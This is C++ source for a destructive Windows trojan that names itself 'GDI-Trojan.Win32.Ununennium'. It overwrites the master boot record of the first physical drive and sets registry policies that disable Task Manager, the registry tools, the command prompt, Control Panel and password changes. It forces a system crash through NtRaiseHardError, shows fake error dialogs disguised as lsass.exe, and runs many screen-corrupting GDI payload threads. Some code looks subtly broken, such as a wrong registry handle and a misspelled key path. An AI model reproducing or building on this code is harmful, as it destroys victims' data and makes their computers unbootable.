
#include "Bootrec.h"
#define hkcu HKEY_CURRENT_USER



VOID regAdd(HKEY hk, LPCWSTR lpsub, LPCWSTR lpval, DWORD dwtype, UINT val) {
	HKEY hky;
	DWORD dwd;
	long res;
	
	res = RegCreateKeyExW(hk, lpsub, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hk, &dwd);
	res = RegSetValueExW(hk, lpval, 0, dwtype, (CONST PBYTE)&val, (int)sizeof(val));
	
	RegCloseKey(hky);
	return;
}

const wchar_t* regPathSystem = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM";
const wchar_t* regPathExplorer = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\EXPLORER";

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);

namespace System {
	void HideTaskbar() {
		ShowWindow(FindWindowA("Shell_TrayWnd", NULL), SW_HIDE);
	}
	
	void KillMBR() {
		DWORD dwBootBits;
		HANDLE hBoot = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hBoot == INVALID_HANDLE_VALUE) {
			MessageBoxA(NULL, "Handle to physical drive could not be opened.", "GDI-Trojan.Win32.Ununennium - Failed to Open Drive", MB_ICONERROR);
			CloseHandle(hBoot);
			exit(0);
		}
		if (!WriteFile(hBoot, mbrData, 32768, &dwBootBits, NULL)) {
			MessageBoxA(NULL, "Could not find the boot record in physical drive.", "GDI-Trojan.Win32.Ununennium - Failed to Delete MBR", MB_ICONERROR);
			CloseHandle(hBoot);
			exit(0);
		}
	}
	
	void Disabler() {
		regAdd(hkcu, regPathSystem, L"DisableTaskmgr", REG_DWORD, 1);
		regAdd(hkcu, regPathSystem, L"DisableRegistryTools", REG_DWORD, 1);
		regAdd(hkcu, L"SOTWARE\\Policies\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 2);
		regAdd(hkcu, regPathExplorer, L"NoRun", REG_DWORD, 1);
		regAdd(hkcu, regPathExplorer, L"NoControlPanel", REG_DWORD, 1);
		regAdd(hkcu, regPathExplorer, L"NoLogoff", REG_DWORD, 1);
		regAdd(hkcu, regPathSystem, L"DisableChangePassword", REG_DWORD, 1);
	}
	
	DWORD CALLBACK message(LPVOID msg) {
		while (true) {
			MessageBoxW(NULL, StringGen(10), L"lsass.exe", MB_ICONASTERISK|MB_RTLREADING|MB_CANCELTRYCONTINUE);
		}
	}
	
	DWORD fakeMessage() {
		MessageBoxA(NULL, "The attached file in this e-mail is not a valid Win32 application.", "wsock32.dll - Application Error", MB_ICONERROR);
		return 0;
	}
	
	void CauseCrash() {
		BYTE ntBool;
		DWORD rsp;
		RtlAdjustPrivilege(19, TRUE, FALSE, &ntBool);
		NtRaiseHardError(0xC0000012, 0, 0, 0, 6, &rsp);
	}
}

namespace GDI {
	DWORD WINAPI splitblt(LPVOID lpvoid)
	{
	HDC hdc;
	while (1) {
		hdc = GetDC(0);
		SplitBlt(hdc, -5, w, h, NOTSRCINVERT); // example value
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI SustainEpicPayload(LPVOID lpvoid)
	{
	CreateThread(NULL, 0, redrawCounter, NULL, 0, 0);
	HDC hdc;
	HBRUSH hbsh;
	while (true) {
		hdc = GetDC(0);
		hbsh = CreateSolidBrush(PALETTERGB(rand() % 239, rand() % 239, rand() % 239));
		StretchBlt(hdc, -5, -5, w+10, h+10, hdc, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdc, 5, 5, w-10, h-10, hdc, 0, 0, w, h, SRCPAINT);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		SelectObject(hdc, hbsh);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI Payload2(LPVOID lpvoid)
	{
	HDC hdc;
	HBRUSH hbsh;
	while (true) {
		hdc = GetDC(0);
		hbsh = CreateSolidBrush(PALETTERGB(rand() % 239, rand() % 239, rand() % 239));
		StretchBlt(hdc, 0, 0, w, h, hdc, w/2, 0, -w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0, h/2, w, -h, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		SelectObject(hdc, hbsh);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI SrcpaintDisp(LPVOID lpvoid)
	{
	HDC hdc;
	double dispangle = 0;
	while (true) {
		hdc = GetDC(0);
		for (FLOAT a = 0; a < w+h; a += 0.9f) {
			int v = cos(dispangle) * 3;
			BitBlt(hdc, 0, a, w, h, hdc, v, a, SRCPAINT);
			dispangle += M_PI / 5;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI BouncingBezier(LPVOID lpvoid)
	{
	HDC hdc;
	HPEN hp;
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (1) {
		hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		POINT opt[4] = {{360, y}, {x, y}, {50, 178}};
		hp = CreatePen(PS_SOLID, rand() % 5 + 10, GetRandomRainbowSpectrum());
		SelectObject(hdc, hp);
		PolyBezier(hdc, opt, 4);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hp);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI anglezoomer(LPVOID lpvd)
	{
	HDC hdc;
	while (true) {
		hdc = GetDC(0);
		StretchBlt(hdc, -10, -10, w+20, h+20, hdc, 0, 0, w-10, h-10, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI gradienttriangle(LPVOID lpvd)
	{ // you must link the msimg32 library (or must you)
    HDC hdc = GetDC(0);
    while (1) {
        TRIVERTEX vtx[3];
        vtx[0].x = rand () % w; vtx[0].y = rand () % h;
        vtx[1].x = rand () % w; vtx[1].y = rand () % h;
        vtx[2].x = rand () % w; vtx[2].y = rand () % h;
        vtx[0].Red = 0xff00; vtx[0].Green = 0xff00; vtx[0].Blue = 0; vtx[0].Alpha = 0xff00;
        vtx[1].Red = 0; vtx[1].Green = 0xff00; vtx[1].Blue = 0xff00; vtx[1].Alpha = 0xff00;
        vtx[2].Red = 0xff00; vtx[2].Green = 0; vtx[2].Blue = 0xff00; vtx[2].Alpha = 0xff00;
        GRADIENT_TRIANGLE gt;
        gt.Vertex1 = 0;
        gt.Vertex2 = 1; gt.Vertex3 = 2;
        GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
        Sleep(10);
    }
}

	DWORD WINAPI trigonshake(LPVOID lpvd)
	{
    HDC hdc;
    double angle = 0.0;
    int xadd, yadd; // x angle and y angle
    while (1) {
        hdc = GetDC(NULL);
        xadd = cos(angle) * 10, yadd = sin(angle) * 10;
        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCPAINT);
        angle += M_PI / 8;
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

	DWORD WINAPI melt(LPVOID lpvoid)
	{
	HDC hdc;
	int rw;
	while (true) {
		hdc = GetDC(0);
		rw = rand() % w;
		int rh = rand() % h;
		BitBlt(hdc, rw, rand() % 20 - 10, 100, h, hdc, rw, 0, SRCPAINT);
		BitBlt(hdc, rand() % 20 - 10, rh, w, 100, hdc, 0, rh, SRCPAINT);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI setshake(LPVOID lpvoid)
	{
	HDC hdc;
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI patstatic(LPVOID lpvoid)
	{
	HDC hdc, mdc;
	HBRUSH hpat;
	while (true) {
		hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
		hpat = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		SetStretchBltMode(hdc, STRETCH_ORSCANS);
		SetStretchBltMode(mdc, STRETCH_ORSCANS);
		StretchBlt(mdc, 0, 0, w/10, h/10, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w/10, h/10, SRCCOPY);
		SelectObject(hdc, hpat);
		PatBlt(hdc, 0, 0, w, rand() % h, PATCOPY);
		DeleteObject(hpat);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}


}

void EndPayload(HANDLE hPayload) {
	TerminateThread(hPayload, 0);
	CloseHandle(hPayload);
}


